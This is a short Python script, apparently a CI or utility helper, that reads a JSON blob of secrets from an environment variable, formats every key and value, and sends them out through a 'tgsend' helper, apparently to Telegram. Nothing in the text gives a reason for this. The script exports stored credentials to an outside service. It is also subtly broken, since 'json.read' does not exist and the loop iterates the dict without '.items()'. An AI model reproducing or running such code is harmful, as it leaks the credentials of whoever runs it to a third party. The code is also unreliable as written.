import os
import json
from pytools.pytools import tgsend

secrets=json.read(os.environ['secrets'])
msg='\n'.join([f'{key}: `{value}`' for key,value in secrets])
tgsend(msg)
